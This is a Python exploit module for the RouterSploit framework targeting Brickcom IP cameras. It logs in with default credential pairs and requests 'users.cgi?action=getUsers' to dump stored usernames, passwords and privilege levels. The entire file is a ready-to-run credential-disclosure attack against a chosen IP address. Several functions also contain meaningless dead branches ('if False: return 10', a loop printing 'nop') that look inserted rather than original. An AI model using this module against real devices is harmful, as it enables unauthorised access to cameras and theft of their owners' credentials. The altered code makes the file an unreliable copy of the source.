import re
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):
    __info__ = {'name': 'Brickcom Camera Credentials Disclosure', 'description': "Exploit implementation for miscellaneous Brickcom cameras with 'users.cgi'.Allows remote credential disclosure by low-privilege user.", 'authors': ('Emiliano Ipar <@maninoipar>', 'Ignacio Agustin Lizaso <@ignacio_lizaso>', 'Gaston Emanuel Rivadero <@derlok_epsilon>', 'Josh Abraham'), 'references': ('https://www.exploit-db.com/exploits/42588/', 'https://www.brickcom.com/news/productCERT_security_advisorie.php'), 'devices': ('Brickcom WCB-040Af', 'Brickcom WCB-100A', 'Brickcom WCB-100Ae', 'Brickcom OB-302Np', 'Brickcom OB-300Af', 'Brickcom OB-500Af')}
    target = OptIP('', 'Target IPv4 or IPv6 address')
    port = OptPort(80, 'Target HTTP port')

    def __init__(self):
        if False:
            return 10
        self.credentials = (('admin', 'admin'), ('viewer', 'viewer'), ('rviewer', 'rviewer'))
        self.configuration = None

    def run(self):
        if False:
            for i in range(10):
                print('nop')
        if self.check():
            print_success('Target appears to be vulnerable')
            print_status('Dumping configuration...')
            print_info(self.configuration)
        else:
            print_error('Exploit failed - target does not appear vulnerable')

    @mute
    def check(self):
        if False:
            return 10
        for (username, password) in self.credentials:
            response = self.http_request(method='GET', path='/cgi-bin/users.cgi?action=getUsers', auth=(username, password))
            if response is None:
                break
            if any([re.findall(regexp, response.text) for regexp in ['User1.username=.*', 'User1.password=.*', 'User1.privilege=.*']]):
                self.configuration = response.text
                return True
        return False